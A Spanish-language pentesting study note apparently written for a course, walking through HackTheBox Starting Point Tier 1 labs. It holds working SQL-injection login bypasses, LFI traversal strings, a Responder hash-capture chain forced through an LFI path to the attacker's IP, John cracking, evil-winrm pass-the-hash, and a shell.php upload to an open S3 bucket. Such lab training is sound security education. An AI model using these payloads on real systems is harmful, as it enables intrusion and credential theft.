# ① Metodología general en HackTheBox Starting Point

El Starting Point de HackTheBox es una secuencia de máquinas guiadas ideales para aprender metodología. Cada máquina tiene preguntas que orientan el proceso de explotación.

| | |
|---|---|
|**Fase**|**Qué hacer**|
|Tier 0|Protocolo único por máquina (FTP, SMB, Telnet...). Conceptos básicos.|
|Tier 1|Combinación de servicios y primeras vulnerabilidades web (SQLi, LFI, Responder).|
|Tier 2|Máquinas más complejas, varias etapas, escalada de privilegios.|

| | |
|---|---|
|**💡 INFO**|La flag siempre está en el escritorio del usuario comprometido (Desktop). En Linux: ~/Desktop/flag.txt o /root/flag.txt. En Windows: C:\Users\<usuario>\Desktop\flag.txt|

Estructura de carpetas recomendada (igual que con Metasploitable):

| |
|---|
|mkdir htb_starting_point<br><br>cd htb_starting_point<br><br>mkdir recon exploits<br><br># Importante: usar la VPN correcta<br><br># HackTheBox tiene DOS VPNs distintas:<br><br>#   Starting Point → para estas máquinas<br><br>#   Machines        → para las máquinas normales (ranked)<br><br># Confundirlas es el error más común → ping no llega|

| | |
|---|---|
|**⚠ AVISO**|Error frecuente: conectarse a la VPN de 'Machines' e intentar hacer ping a una IP de Starting Point. Resultado: 0% de paquetes recibidos. Solución: descargar la VPN de 'Starting Point' desde el panel de HackTheBox.|

# ② Máquina: Appointment — SQL Injection (SQLi)

Appointment expone un panel de login web vulnerable a inyección SQL. El objetivo es autenticarse sin contraseña válida manipulando la consulta SQL del backend.

## Conceptos previos: cómo funciona la autenticación SQL

Un login típico ejecuta esta consulta en el backend:

| |
|---|
|SELECT * FROM users WHERE username='admin' AND password='pass123';<br><br># Si devuelve filas → acceso concedido<br><br># Si no devuelve nada → acceso denegado|

## Vector 1: Comentario SQL ( -- )

Añadir -- al final del campo usuario convierte el resto de la consulta en comentario, eliminando la validación de contraseña:

| |
|---|
|# Input: usuario = admin'--    contraseña = cualquier_cosa<br><br># Consulta resultante:<br><br>SELECT * FROM users WHERE username='admin'--' AND password='xxx';<br><br>#                                              ^^^^^^^^^^^^^^^^ comentado<br><br># Equivale a:<br><br>SELECT * FROM users WHERE username='admin';<br><br># → La contraseña se ignora completamente|

## Vector 2: OR con tautología ( ' OR 1=1 -- )

Inyectar una condición siempre verdadera hace que la cláusula WHERE siempre se cumpla:

| |
|---|
|# Input: usuario = admin' OR 1=1--    contraseña = lo_que_sea<br><br># Consulta resultante:<br><br>SELECT * FROM users WHERE username='admin' OR 1=1--' AND password='x';<br><br># Lógica:<br><br>#   username='admin'  → puede ser TRUE o FALSE<br><br>#   OR 1=1            → SIEMPRE TRUE<br><br>#   Resultado: condición completa = TRUE → acceso concedido<br><br># ¿Por qué 1=1 y no 1=2?<br><br>#   1=1 siempre es TRUE → el OR hace que la condición sea TRUE<br><br>#   1=2 sería FALSE     → si el usuario no existe, falla<br><br># IMPORTANTE: la comilla queda ABIERTA<br><br>#   Si cerráramos: admin' OR '1'='1  → la contraseña volvería a evaluarse<br><br>#   Dejándola abierta: el -- descarta todo lo que viene después|

| | |
|---|---|
|**🔐 HACKING**|SQLi en formularios de login: prueba siempre primero admin'-- y admin' OR 1=1-- antes de recurrir a herramientas. Si el login es vulnerable, el acceso es inmediato sin necesidad de conocer ninguna contraseña.|

| | | |
|---|---|---|
|**Payload**|**Efecto**|**Cuándo usar**|
|admin'--|Comenta la validación de contraseña|Cuando sabes el usuario|
|' OR 1=1--|Tautología: siempre verdadero|Cuando no sabes el usuario|
|admin' OR '1'='1|Variante con comillas cerradas (depende del backend)|Cuando -- no funciona|

# ③ Máquina: Crocodile — FTP anónimo + credenciales en web

Crocodile combina FTP con autenticación anónima y un panel de login web. Las credenciales se obtienen desde el FTP y se usan para acceder a la web.

| | | | | | | | | |
|---|---|---|---|---|---|---|---|---|
|**Nmap**|**→**|**FTP anónimo**|**→**|**Descargar archivos**|**→**|**Login web**|**→**|**Flag**|

| |
|---|
|# Fase 1: escaneo<br><br>nmap -sCV <IP><br><br># Resultado esperado: puerto 21 (FTP) y puerto 80 (HTTP)<br><br># Fase 2: FTP anónimo<br><br>ftp <IP><br><br># Usuario: anonymous<br><br># Contraseña: (Enter / cualquier cosa)<br><br>ftp> ls -la          # listar archivos<br><br>ftp> get users.txt   # descargar archivo de usuarios<br><br>ftp> get passwords.txt<br><br>ftp> bye<br><br># Fase 3: fuzzing web para encontrar el panel de login<br><br>ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c<br><br># Resultado: /login.php (o similar)<br><br># Fase 4: login con credenciales obtenidas del FTP<br><br># Probar cada usuario:contraseña del archivo hasta encontrar la válida|

| | |
|---|---|
|**💡 INFO**|robots.txt es una fuente de información clave. Siempre comprobar http://<IP>/robots.txt manualmente. Contiene los directorios que el propietario NO quiere que los buscadores indexen — exactamente los más interesantes para un pentester.|

# ④ Máquina: Responder — LLMNR Poisoning + NTLMv2

Responder es la máquina más conceptualmente importante del Tier 1. Introduce el ataque LLMNR/NBT-NS Poisoning, un vector muy común en entornos Windows corporativos.

## ¿Qué es LLMNR/NBT-NS?

Cuando Windows no puede resolver un nombre mediante DNS, recurre a protocolos de resolución local: LLMNR (Link-Local Multicast Name Resolution) y NBT-NS (NetBIOS Name Service). Ambos hacen un broadcast preguntando '¿quién tiene este nombre?'.

| |
|---|
|# Escenario real:<br><br># El usuario teclea \\CarpetaCompartida en el explorador de Windows<br><br># DNS no conoce ese nombre → Windows hace broadcast LLMNR/NBT-NS<br><br># '¿Hay alguien llamado CarpetaCompartida en la red?'<br><br># El atacante (con Responder escuchando) responde:<br><br># 'Soy yo, CarpetaCompartida, conéctate a mí'<br><br># Windows intenta autenticarse → envía hash NTLMv2<br><br># Responder captura ese hash|

## Flujo de explotación con Responder

| | | | | | | | | | | | | |
|---|---|---|---|---|---|---|---|---|---|---|---|---|
|**Nmap**|**→**|**Añadir IP a /etc/hosts**|**→**|**Responder escucha**|**→**|**Víctima visita LFI**|**→**|**Captura hash NTLMv2**|**→**|**John crackea**|**→**|**evil-winrm**|

| |
|---|
|# Paso 1: Nmap<br><br>nmap -sCV <IP><br><br># Puertos relevantes: 80 (HTTP), 5985 (WinRM)<br><br># Paso 2: Añadir dominio a /etc/hosts<br><br># La web redirige la IP a un dominio (ej: unika.htb)<br><br>echo '<IP>  unika.htb' >> /etc/hosts<br><br># Ahora el navegador puede resolver el dominio internamente<br><br># Paso 3: Detectar el LFI<br><br># Al cambiar el idioma de la web, aparece el parámetro vulnerable:<br><br># http://unika.htb/index.php?page=german.html<br><br># Probar LFI:<br><br># http://unika.htb/index.php?page=../../../../windows/system32/drivers/etc/hosts<br><br># Si muestra el contenido del archivo → LFI confirmado|

| |
|---|
|# Paso 4: Iniciar Responder (en la interfaz de la VPN)<br><br>sudo responder -I tun0<br><br># -I tun0 → interfaz de la VPN de HackTheBox<br><br># Paso 5: Forzar al servidor a conectarse a nosotros via LFI<br><br># En el navegador:<br><br># http://unika.htb/index.php?page=//TU_IP_TUN0/share<br><br># El servidor intenta montar un recurso SMB inexistente en nuestra IP<br><br># → Responder captura el hash NTLMv2 del proceso del servidor web<br><br># Ejemplo de hash capturado (Administrator::UNIKA-HTB:...):<br><br># Administrator::UNIKA-HTB:1122334455667788:hash_ntlmv2:datos_desafio<br><br># Paso 6: Guardar el hash<br><br>echo 'Administrator::UNIKA-HTB:...' > hash.txt|

| |
|---|
|# Paso 7: Crackear con John the Ripper<br><br>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt<br><br>john --show hash.txt<br><br># → Contraseña encontrada: badminton (ejemplo de la máquina)<br><br># Paso 8: Conectarse via WinRM con evil-winrm<br><br>evil-winrm -i <IP> -u administrator -p 'badminton'<br><br># Paso 9: Buscar la flag<br><br># La flag siempre está en el Desktop del usuario<br><br>dir C:\Users\mike\Desktop\<br><br>type C:\Users\mike\Desktop\flag.txt|

| | |
|---|---|
|**🔐 HACKING**|Responder en VPN puede dar problemas técnicos. Si el hash no aparece: (1) verificar que -I apunta a tun0 y no a otra interfaz, (2) esperar más tiempo, (3) reiniciar la máquina HTB. En entornos reales de red interna, Responder funciona de forma muy fiable.|

| | |
|---|---|
|**💡 INFO**|Este ataque es muy común en auditorías internas reales: muchos usuarios tienen accesos directos a carpetas de red que ya no existen. Cuando Windows intenta resolverlas, Responder captura el hash. No requiere exploits, solo estar en la misma red.|

# ⑤ WinRM y evil-winrm — Acceso remoto Windows

WinRM (Windows Remote Management) es el equivalente a SSH en Windows. Puerto 5985 (HTTP) o 5986 (HTTPS). Evil-winrm es el cliente de línea de comandos para pentesting.

| |
|---|
|# Instalación:<br><br>gem install evil-winrm<br><br># Conexión con usuario:contraseña:<br><br>evil-winrm -i <IP> -u <usuario> -p '<contraseña>'<br><br># Conexión con hash (Pass-the-Hash):<br><br>evil-winrm -i <IP> -u <usuario> -H <NTLM_hash><br><br># Una vez dentro — PowerShell básico para buscar la flag:<br><br># Listar directorio Desktop del usuario actual:<br><br>dir $env:USERPROFILE\Desktop<br><br># Buscar flag.txt recursivamente desde C:\:<br><br>Get-ChildItem -Path C:\ -Recurse -Filter flag.txt -ErrorAction SilentlyContinue<br><br># Leer la flag:<br><br>type C:\Users\mike\Desktop\flag.txt<br><br>Get-Content C:\Users\mike\Desktop\flag.txt|

| | | |
|---|---|---|
|**Comando PowerShell**|**Equivalente Linux**|**Función**|
|Get-ChildItem (gci, ls, dir)|ls -la|Listar directorio|
|Get-ChildItem -Recurse -Filter *.txt|find . -name '*.txt'|Buscar archivos recursivo|
|Get-Content archivo.txt|cat archivo.txt|Leer archivo|
|$env:USERPROFILE|$HOME|Home del usuario actual|
|whoami|whoami|Usuario actual|
|ipconfig|ip a / ifconfig|Interfaces de red|

# ⑥ LFI — Local File Inclusion

LFI (Local File Inclusion) permite leer archivos del servidor a través de un parámetro de URL que incluye ficheros sin sanitización. Es una vulnerabilidad de capa de aplicación (L7).

| |
|---|
|# Indicador de vulnerabilidad: parámetro 'page' o 'file' en la URL<br><br># http://victima.com/index.php?page=contacto.html<br><br># Prueba básica de LFI (Linux):<br><br>http://victima.com/index.php?page=../../../../etc/passwd<br><br># Prueba básica de LFI (Windows):<br><br>http://victima.com/index.php?page=../../../../windows/system32/drivers/etc/hosts<br><br># LFI para forzar autenticación NTLM (Responder):<br><br>http://victima.com/index.php?page=//NUESTRA_IP/share_falso<br><br># El servidor intenta acceder al recurso SMB → envía hash NTLMv2<br><br># Archivos interesantes en Windows:<br><br># C:\Windows\System32\drivers\etc\hosts  → resolución DNS local<br><br># C:\Users\<usuario>\Desktop\flag.txt    → flag<br><br># C:\xampp\passwords.txt                   → credenciales XAMPP|

| | |
|---|---|
|**⚠ AVISO**|LFI ≠ RFI. LFI incluye archivos del propio servidor. RFI (Remote File Inclusion) incluye archivos desde una URL externa. LFI es más común porque incluir URLs remotas suele estar deshabilitado en la configuración de PHP.|

# ⑦ MySQL/MariaDB — Comandos esenciales en explotación

Algunas máquinas de Starting Point exponen MySQL directamente (puerto 3306) con credenciales débiles o acceso sin contraseña. El cliente mysql de Kali permite conectarse directamente.

| |
|---|
|# Conexión sin contraseña (root sin auth):<br><br>mysql -h <IP> -u root<br><br># Conexión con usuario y contraseña:<br><br>mysql -h <IP> -u root -p<br><br># (pedirá contraseña)<br><br># Comandos SQL esenciales una vez dentro:<br><br>SHOW DATABASES;               -- listar todas las bases de datos<br><br>USE nombre_base_datos;        -- seleccionar una BD<br><br>SHOW TABLES;                  -- listar tablas de la BD activa<br><br>DESCRIBE config;              -- estructura de la tabla config (columnas y tipos)<br><br>SELECT * FROM config;         -- todos los datos de la tabla config<br><br>SELECT * FROM users;          -- usuarios y (posiblemente) contraseñas<br><br># Encontrar la flag:<br><br>SELECT * FROM config;         -- la flag suele estar aquí como valor de una clave|

| | |
|---|---|
|**💡 INFO**|DESCRIBE tabla muestra la estructura (columnas, tipos de datos). No muestra los datos. Para ver los datos: SELECT * FROM tabla. La flag en estas máquinas suele estar como valor en una tabla de configuración.|

# ⑧ Máquina: Three — S3 Bucket + Fuzzing de subdominios

Three introduce el fuzzing de subdominios y el acceso a buckets de AWS S3 mal configurados. Es el último del Tier 1 y es más rápido de resolver de lo que parece.

| |
|---|
|# Fuzzing de subdominios (poner FUZZ al principio de la URL):<br><br>ffuf -u http://FUZZ.dominio.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c<br><br># Resultado esperado: s3.dominio.com<br><br># Acceso a S3 bucket con AWS CLI:<br><br># Instalar si no está:<br><br>sudo apt install awscli -y<br><br># Configurar con credenciales ficticias (el bucket es público):<br><br>aws configure<br><br># AWS Access Key ID:     'placeholder'<br><br># AWS Secret Access Key: 'placeholder'<br><br># Default region:        us-east-1<br><br># Listar contenido del bucket:<br><br>aws --endpoint-url http://s3.dominio.com s3 ls s3://dominio.com<br><br># Subir un archivo (si el bucket permite escritura):<br><br>aws --endpoint-url http://s3.dominio.com s3 cp shell.php s3://dominio.com<br><br># Acceder al archivo subido desde el navegador:<br><br>http://dominio.com/shell.php|

# ⑨ Resumen: vectores del Tier 1

| | | | |
|---|---|---|---|
|**Máquina**|**Servicio**|**Vector**|**Acceso obtenido**|
|Appointment|HTTP (80)|SQLi: admin'-- o ' OR 1=1--|Login web sin credenciales|
|Sequel|MySQL (3306)|MySQL sin contraseña (root vacío)|Acceso a BD, flag en tabla config|
|Crocodile|FTP (21) + HTTP (80)|FTP anónimo → credenciales → login web|Panel de administración web|
|Responder|HTTP (80) + WinRM (5985)|LFI → LLMNR Poisoning → NTLMv2 → John → evil-winrm|Shell Windows como Administrator|
|Three|HTTP (80) + S3|Fuzzing subdominios → S3 bucket público con escritura|RCE via web shell subida|

| | |
|---|---|
|**✓ OBJETIVO**|Workflow HackTheBox Starting Point: (1) Nmap básico, (2) identificar servicios, (3) buscar credenciales por defecto o anónimas, (4) enumerar web (ffuf + robots.txt), (5) explotar la vulnerabilidad principal, (6) flag en Desktop del usuario.|

# ⑩ Herramientas utilizadas en esta sesión

| | | |
|---|---|---|
|**Herramienta**|**Instalación**|**Uso principal**|
|Responder|ya en Kali|LLMNR/NBT-NS Poisoning, captura hashes NTLMv2|
|evil-winrm|gem install evil-winrm|Conexión WinRM a máquinas Windows|
|John the Ripper|ya en Kali|Crackear hashes NTLMv2, MD5, etc.|
|ffuf|ya en Kali|Fuzzing de directorios web y subdominios|
|mysql|ya en Kali|Cliente MySQL para conectarse a bases de datos|
|SecLists|git clone github.com/danielmiessler/SecLists|Diccionarios para fuzzing y fuerza bruta|
|awscli|sudo apt install awscli|Interactuar con buckets S3|
|Nmap|en Kali|Escaneo de puertos y detección de servicios|
|Hydra|ya en Kal|Fuerza bruta en formularios web y servicios|

| | |
|---|---|
|**💡 INFO**|Instalar SecLists es prioritario: sudo git clone https://github.com/danielmiessler/SecLists /usr/share/seclists. Es el diccionario de referencia para fuzzing web, subdominios, usuarios y contraseñas.|


---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../../apuntes Joselu/MODULO3/resumen_master_clase23.md|resumen_master_clase23]] — Hydra, Metasploitable / DVWA, Telnet
- [[../OWASP API Top 10 Labs.md|OWASP API Top 10 Labs]] — Post-Explotación, SQL Injection, Telnet
- [[../../Apuntes/06 - Explotacion y Post-Explotacion/Explotación Avanzada de Servicios Vulnerables III — NFS, Tomcat y MySQL.md|Explotación Avanzada de Servicios Vulnerables III — NFS, Tomcat y MySQL]] — Hydra, Metasploitable / DVWA, SQL Injection
- [[Explotación avanzada de servicios vulnerables II.md|Explotación avanzada de servicios vulnerables II]] — Hydra, Metasploitable / DVWA, SQL Injection
- [[HTB Starting Point — Repaso e inicio de Tier 2.md|HTB Starting Point — Repaso e inicio de Tier 2]] — John / Hashcat, Metasploitable / DVWA, SQL Injection
- [[../../apuntes Joselu/MODULO3/resumen_master_clase25.md|resumen_master_clase25]] — Hydra, Metasploitable / DVWA, SQL Injection

### 🛠️ Herramientas

- [[comandos/FFUF|FFUF]]
- [[comandos/Hydra|Hydra]]
- [[comandos/John_Hashcat|John / Hashcat]]
- [[comandos/Metasploit|Netcat / Reverse Shells]]
- [[comandos/Nmap|Nmap]]
- [[comandos/SSH|SSH]]
- [[comandos/Telnet|Telnet]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/06 - Explotacion y Post-Explotacion/Reverse Shells y Post-Explotación.md|Command Injection / RCE]]
- [[Apuntes/05 - Auditoria Web/Path Traversal — 6 Casos y Bypasses.md|Path Traversal / LFI]]
- [[Apuntes/05 - Auditoria Web/SQL Injection.md|SQL Injection]]

> #command-injection #escalada-privilegios #ffuf #hack-the-box #hydra #john #kali #lfi #linux #metasploitable #netcat #nmap #pentest #post-explotacion #redes #reverse-shell #rfi #sqli #ssh #telnet #windows
